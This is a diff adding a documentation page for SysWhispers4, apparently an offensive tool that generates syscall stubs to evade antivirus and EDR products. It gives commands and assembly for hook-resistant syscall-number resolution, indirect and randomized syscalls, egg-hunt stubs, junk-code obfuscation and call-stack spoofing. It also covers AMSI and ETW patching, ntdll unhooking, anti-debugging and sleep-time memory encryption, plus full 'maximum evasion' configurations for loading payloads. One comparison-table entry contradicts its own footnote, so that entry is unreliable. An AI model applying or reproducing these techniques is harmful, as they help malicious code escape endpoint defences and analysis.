@@ -1,0 +1,558 @@
+---
+title: 'Advanced Evasion'
+description: 'Advanced evasion configurations: SSN resolution methods, invocation techniques, and obfuscation'
+icon: 'shield-halved'
+---
+
+## Overview
+
+SysWhispers4 provides multiple strategies for resolving syscall numbers (SSNs) and invoking syscalls, plus comprehensive evasion features to bypass AV/EDR detection. This guide covers all advanced options.
+
+## SSN Resolution Methods
+
+SysWhispers4 supports 8 different strategies for obtaining syscall numbers at runtime.
+
+### FreshyCalls (Default)
+
+**Recommended for most scenarios.** Sorts all `Nt*` exports from ntdll by virtual address — the sorted index equals the SSN.
+
+```bash
+python syswhispers.py --preset common --resolve freshycalls
+```
+
+**Advantages:**
+- Works even if **every** stub is hooked
+- Reads only VAs, never function bytes
+- Very fast (one-time VA sort)
+- Hook-resistant
+
+**How it works:**
+1. Enumerate all `Nt*` exports from ntdll
+2. Sort by virtual address (ascending)
+3. Sorted index = syscall number
+
+### Static Embedding
+
+Embeds SSNs from the bundled j00ru syscall table at generation time.
+
+```bash
+python syswhispers.py --preset common --resolve static
+```
+
+**Advantages:**
+- Fastest (no runtime parsing)
+- No ntdll interaction needed
+
+**Disadvantages:**
+- SSN table in binary is a detection signal
+- Must match target Windows version exactly
+- Less flexible than dynamic methods
+
+**Update the table:**
+```bash
+python scripts/update_syscall_table.py
+```
+
+### Hell's Gate
+
+Reads the `mov eax, <SSN>` opcode directly from each ntdll stub.
+
+```bash
+python syswhispers.py --preset common --resolve hells_gate
+```
+
+**Opcode pattern:**
+```asm
+4C 8B D1              ; mov r10, rcx
+B8 [SSN_lo] [SSN_hi] 00 00  ; mov eax, <SSN>
+```
+
+**Advantages:**
+- Reads actual ntdll code
+- Fast
+
+**Disadvantages:**
+- **Fails when stub is hooked** (first bytes overwritten)
+
+### Halo's Gate
+
+Extends Hell's Gate with neighbor scanning. When a stub is hooked, scans ±8 neighboring stubs and infers SSN via offset arithmetic.
+
+```bash
+python syswhispers.py --preset common --resolve halos_gate
+```
+
+**How it works:**
+1. Try to read SSN from target stub (Hell's Gate)
+2. If hooked, scan neighbors: `Nt[Function-8]` through `Nt[Function+8]`
+3. Find first clean neighbor, calculate offset
+4. Infer target SSN: `neighbor_SSN + offset`
+
+**Advantages:**
+- Handles sparse hooks (not every function hooked)
+- Good balance of speed and resilience
+
+### Tartarus' Gate
+
+Extends Halo's Gate to detect **all** common EDR hook patterns.
+
+```bash
+python syswhispers.py --preset common --resolve tartarus
+```
+
+**Detected hook opcodes:**
+- `E9 xx xx xx xx` — near relative JMP (most common)
+- `FF 25 xx xx xx xx` — far absolute JMP via memory
+- `EB xx` — short JMP
+- `CC` — int3 breakpoint
+- `E8 xx xx xx xx` — call (rare)
+
+**Advantages:**
+- Handles complex EDR hooks
+- Scans up to ±16 neighbors
+- High hook resistance
+
+### SyscallsFromDisk
+
+**Bypasses ALL hooks.** Maps a clean copy of ntdll from `\KnownDlls\ntdll.dll` and reads SSNs from the pristine `.text` section.
+
+```bash
+python syswhispers.py --preset injection --resolve from_disk
+```
+
+**How it works:**
+1. `NtOpenSection(\KnownDlls\ntdll.dll)`
+2. `NtMapViewOfSection()` — map clean ntdll to memory
+3. Read SSNs from clean `.text` section
+4. `NtUnmapViewOfSection()` — cleanup
+
+**Advantages:**
+- **Maximum hook resistance** — EDR hooks irrelevant
+- Reads from on-disk image, guaranteed clean
+
+**Disadvantages:**
+- Slower (disk mapping overhead)
+- Requires system privileges for `\KnownDlls` access
+
+### RecycledGate
+
+**Most resilient method.** Combines FreshyCalls (sort-by-VA) with Hell's Gate opcode validation.
+
+```bash
+python syswhispers.py --preset stealth --resolve recycled
+```
+
+**How it works:**
+1. Get candidate SSN from sorted VA position (FreshyCalls)
+2. If stub is clean, verify SSN matches opcode (double-check)
+3. If stub is hooked, trust the sorted-index SSN (hook-resistant)
+
+**Advantages:**
+- Works even if hooks **and** export table are modified
+- Cross-validation increases confidence
+- Best reliability
+
+### HW Breakpoint
+
+Uses CPU debug registers (DR0–DR3) + Vectored Exception Handler (VEH) to extract SSNs.
+
+```bash
+python syswhispers.py --preset common --resolve hw_breakpoint
+```
+
+**How it works:**
+1. Set DR0 = address of `syscall` instruction in ntdll stub
+2. Register VEH handler
+3. Call into stub — VEH catches `EXCEPTION_SINGLE_STEP`
+4. At breakpoint, `EAX` contains the SSN — capture it
+5. Clear DR0, skip syscall, continue
+
+**Advantages:**
+- No reading of potentially-tampered bytes
+- Works even with complex hooks
+
+**Disadvantages:**
+- Slower (exception handling overhead)
+- Advanced technique
+
+## Comparison Table
+
+| Method | Hook Resistance | Speed | Notes |
+|--------|:--------------:|:-----:|-------|
+| Static | None | ⚡ Fastest | Embedded table, version-specific |
+| Hell's Gate | ❌ Low | ⚡ Fast | Fails if hooked |
+| Halo's Gate | ⚠️ Medium | ⚡ Fast | Neighbor scan (±8) |
+| Tartarus' Gate | ✅ High | ⚡ Fast | Detects E9/FF25/EB/CC/E8 hooks, ±16 |
+| **FreshyCalls** | ✅ Very High | 🔥 Medium | **DEFAULT** — sort by VA |
+| SyscallsFromDisk | ✅✅ Maximum | 🐌 Slow | Maps clean ntdll from disk |
+| **RecycledGate** | ✅✅ Maximum | 🔥 Medium | **MOST RESILIENT** — FreshyCalls + validation |
+| HW Breakpoint | ✅✅ Maximum | 🐌 Slow | DR registers + VEH |
+
+## Invocation Methods
+
+How the `syscall` instruction is executed affects EDR detection.
+
+### Embedded (Direct Syscall)
+
+**Default.** The `syscall` instruction lives in your stub.
+
+```bash
+python syswhispers.py --preset common --method embedded
+```
+
+**Generated ASM:**
+```asm
+SW4_NtAllocateVirtualMemory PROC
+    mov r10, rcx
+    mov eax, DWORD PTR [SW4_SsnTable + N*4]
+    syscall          ; <-- syscall in YOUR PE
+    ret
+SW4_NtAllocateVirtualMemory ENDP
+```
+
+**Detection vector:** At kernel entry, `RIP` points into your PE (not ntdll) — detectable by EDRs.
+
+### Indirect
+
+Jumps to a `syscall;ret` gadget **inside ntdll.dll**.
+
+```bash
+python syswhispers.py --preset injection --method indirect
+```
+
+**Generated ASM:**
+```asm
+SW4_NtAllocateVirtualMemory PROC
+    mov r10, rcx
+    mov eax, DWORD PTR [SW4_SsnTable + N*4]
+    jmp QWORD PTR [SW4_Gadget]  ; --> ntdll!syscall;ret
+SW4_NtAllocateVirtualMemory ENDP
+```
+
+**Advantages:**
+- At kernel entry, `RIP` appears to be inside ntdll
+- Looks identical to a legitimate API call
+- No `syscall` opcode in your PE on disk
+
+### Randomized Indirect
+
+Selects a **random** gadget from a pool of up to 64 on every call.
+
+```bash
+python syswhispers.py --preset stealth --method randomized
+```
+
+**Generated ASM:**
+```asm
+SW4_NtAllocateVirtualMemory PROC
+    mov r10, rcx
+    mov r11, rdx                      ; SAVE rdx
+    rdtsc                              ; eax:edx = TSC (entropy)
+    xor eax, edx                       ; mix
+    and eax, 63                        ; pool index (0..63)
+    lea rcx, [SW4_GadgetPool]
+    mov rcx, QWORD PTR [rcx + rax*8]   ; random gadget
+    mov rdx, r11                       ; RESTORE rdx
+    mov eax, DWORD PTR [SW4_SsnTable + N*4]
+    jmp rcx                            ; --> random ntdll gadget
+SW4_NtAllocateVirtualMemory ENDP
+```
+
+**Advantages:**
+- Defeats EDR heuristics that whitelist specific gadget addresses
+- Per-call entropy (no API call needed)
+- Maximum stealth
+
+**Note:** SW3 had a bug where `rdtsc` corrupted `edx` (arg2). SW4 correctly saves/restores `rdx`.
+
+### Egg Hunt
+
+Stubs contain an 8-byte random egg marker instead of `syscall`. `SW4_HatchEggs()` replaces eggs at runtime.
+
+```bash
+python syswhispers.py --preset common --method egg
+```
+
+**Generated ASM (before hatching):**
+```asm
+SW4_NtAllocateVirtualMemory PROC
+    mov r10, rcx
+    mov eax, DWORD PTR [SW4_SsnTable + N*4]
+    DB 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE  ; egg
+    ret
+SW4_NtAllocateVirtualMemory ENDP
+```
+
+**Runtime hatching:**
+```c
+SW4_HatchEggs();  // Scans .text, replaces eggs with 0F 05 (syscall)
+SW4_Initialize();
+```
+
+**Advantages:**
+- **No `syscall` opcode in binary on disk**
+- Defeats static analysis
+
+**Disadvantage:**
+- Must call `SW4_HatchEggs()` before any syscalls
+
+## Evasion Features
+
+### Obfuscation
+
+Randomizes stub ordering and injects junk instructions.
+
+```bash
+python syswhispers.py --preset common --obfuscate
+```
+
+**14 junk instruction variants:**
+```asm
+nop
+xchg ax, ax
+lea r11, [r11]
+nop DWORD PTR [rax]
+xchg r11, r11
+test r11d, 0ABh
+push 042h
+pop r11
+fnop
+lea rsp, [rsp + 00h]
+; ... and more
+```
+
+**Result:** Each stub has unique instruction patterns — defeats signature-based detection.
+
+### SSN Encryption
+
+XOR-encrypts SSN values at rest.
+
+```bash
+python syswhispers.py --preset common --encrypt-ssn
+```
+
+**Generated code:**
+```c
+#define SW4_XOR_KEY 0xDEADF00DU  // random compile-time key
+```
+
+**ASM stub:**
+```asm
+mov eax, DWORD PTR [SW4_SsnTable + N*4]  ; encrypted
+xor eax, SW4_XOR_KEY                      ; decrypt
+syscall
+```
+
+**Advantage:** No plaintext SSN table in binary at rest.
+
+### Call Stack Spoofing
+
+Replaces the visible return address with a pointer into ntdll.
+
+```bash
+python syswhispers.py --preset stealth --stack-spoof
+```
+
+**Usage:**
+```c
+SW4_CallWithSpoofedStack((PVOID)SW4_NtAllocateVirtualMemory, ...);
+```
+
+**How it works:**
+```asm
+SW4_CallWithSpoofedStack PROC
+    pop r11                              ; save real return
+    push [SW4_SpoofReturnAddr]           ; push ntdll address
+    push r11                             ; real (hidden below)
+    jmp rax                              ; execute target
+SW4_CallWithSpoofedStack ENDP
+```
+
+**Result:** Stack-walking EDRs see legitimate ntdll return addresses.
+
+### ETW Bypass
+
+Patches `ntdll!EtwEventWrite` to return `STATUS_ACCESS_DENIED`.
+
+```bash
+python syswhispers.py --preset stealth --etw-bypass
+```
+
+**Usage:**
+```c
+SW4_PatchEtw();  // Call early, before suspicious operations
+```
+
+**Note:** This bypasses **user-mode** ETW only. Kernel-mode ETW-Ti callbacks are unaffected.
+
+### AMSI Bypass
+
+Patches `amsi.dll!AmsiScanBuffer` to return `E_INVALIDARG`.
+
+```bash
+python syswhispers.py --preset stealth --amsi-bypass
+```
+
+**Usage:**
+```c
+SW4_PatchAmsi();  // Call before loading scripts/payloads
+```
+
+**How it works:**
+1. Locate `amsi.dll!AmsiScanBuffer`
+2. Patch first bytes to `return E_INVALIDARG`
+3. AMSI thinks scan arguments are invalid, allows execution
+
+### ntdll Unhooking
+
+Maps a clean ntdll from `\KnownDlls\` and overwrites the hooked `.text` section.
+
+```bash
+python syswhispers.py --preset stealth --unhook-ntdll
+```
+
+**Usage:**
+```c
+SW4_UnhookNtdll();   // BEFORE Initialize for best results
+SW4_Initialize();
+```
+
+**Flow:**
+1. `NtOpenSection(\KnownDlls\ntdll.dll)`
+2. `NtMapViewOfSection()` — map clean ntdll
+3. Find `.text` section in clean copy
+4. `VirtualProtect(RWX)` on hooked ntdll
+5. `memcpy(clean → hooked)`
+6. `VirtualProtect(RX)` — restore protection
+7. Cleanup
+
+**Result:** ALL inline hooks removed from ntdll.
+
+### Anti-Debugging
+
+Performs 6 checks to detect debugger/analysis presence.
+
+```bash
+python syswhispers.py --preset stealth --anti-debug
+```
+
+**Usage:**
+```c
+if (!SW4_AntiDebugCheck()) {
+    // Debugger detected — exit or take evasive action
+    ExitProcess(0);
+}
+```
+
+**6 checks:**
+
+| Check | Technique | Detects |
+|-------|-----------|----------|
+| 1 | `PEB.BeingDebugged` | Standard debugger attachment |
+| 2 | `NtGlobalFlag` (offset 0x70) | Heap debug flags |
+| 3 | `RDTSC` timing delta | Single-stepping / tracing |
+| 4 | `NtQueryInformationProcess(ProcessDebugPort)` | Kernel debug port |
+| 5 | Heap flags analysis | Debug heap indicators |
+| 6 | Instrumentation callback detection | EDR hooks |
+
+### Sleep Encryption
+
+**Ekko-style** memory encryption during sleep.
+
+```bash
+python syswhispers.py --preset stealth --sleep-encrypt
+```
+
+**Usage:**
+```c
+// Instead of Sleep(5000):
+SW4_SleepEncrypt(5000);  // .text encrypted during entire sleep
+```
+
+**How it works:**
+1. Generate random XOR key via `RDTSC`
+2. XOR-encrypt own `.text` section
+3. Set waitable timer + queue APC to decrypt
+4. Sleep in alertable state
+5. Timer fires → APC decrypts `.text` → execution resumes
+
+**Defeats:**
+- Memory scanners during sleep (code is gibberish)
+- Periodic module scans
+- YARA/signature scans on in-memory PE
+
+## Recommended Configurations
+
+### Maximum Evasion (Red Team)
+
+```bash
+python syswhispers.py --preset stealth \
+    --method randomized --resolve recycled \
+    --obfuscate --encrypt-ssn --stack-spoof \
+    --etw-bypass --amsi-bypass --unhook-ntdll \
+    --anti-debug --sleep-encrypt
+```
+
+**Includes:**
+- Randomized indirect syscalls (64 gadgets)
+- RecycledGate (most resilient SSN resolution)
+- All evasion features enabled
+
+### Bypass Heavily Hooked EDR
+
+```bash
+python syswhispers.py --preset injection \
+    --method indirect --resolve from_disk \
+    --unhook-ntdll --encrypt-ssn
+```
+
+**Strategy:**
+- Read clean SSNs from disk (bypasses all hooks)
+- Unhook ntdll `.text` section
+- Indirect syscalls (RIP in ntdll)
+
+### Fast & Stealthy
+
+```bash
+python syswhispers.py --preset common \
+    --method randomized --resolve freshycalls \
+    --obfuscate
+```
+
+**Balance:** Good evasion without significant performance overhead.
+
+### No Syscall on Disk
+
+```bash
+python syswhispers.py --preset injection \
+    --method egg --resolve halos_gate \
+    --obfuscate
+```
+
+**Strategy:** Egg hunt (no `0F 05` on disk) + junk instructions.
+
+## EDR Detection Landscape
+
+| Detection Vector | Embedded | Indirect | Randomized | Egg |
+|------------------|:--------:|:--------:|:----------:|:---:|
+| User-mode hook bypass | ✅ | ✅ | ✅ | ✅ |
+| RIP inside ntdll at syscall | ❌ | ✅ | ✅ | ❌ |
+| No `0F 05` in binary on disk | ✅¹ | ✅ | ✅ | ✅ |
+| Random gadget per call | ❌ | ❌ | ✅ | ❌ |
+| Clean call stack | `--stack-spoof` | `--stack-spoof` | `--stack-spoof` | `--stack-spoof` |
+| Memory scan evasion | `--sleep-encrypt` | `--sleep-encrypt` | `--sleep-encrypt` | `--sleep-encrypt` |
+| Kernel ETW-Ti bypass | ❌² | ❌² | ❌² | ❌² |
+
+¹ Syscall opcode is in your PE's `.text` section (at your code address, not ntdll)  
+² ETW-Ti fires inside the kernel — no user-mode technique bypasses it without kernel access
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="MSVC Integration" icon="microsoft" href="/guides/integration-msvc">
+    Complete Visual Studio project setup
+  </Card>
+  <Card title="MinGW Integration" icon="code" href="/guides/integration-mingw">
+    MinGW and Clang compiler integration
+  </Card>
+</CardGroup>
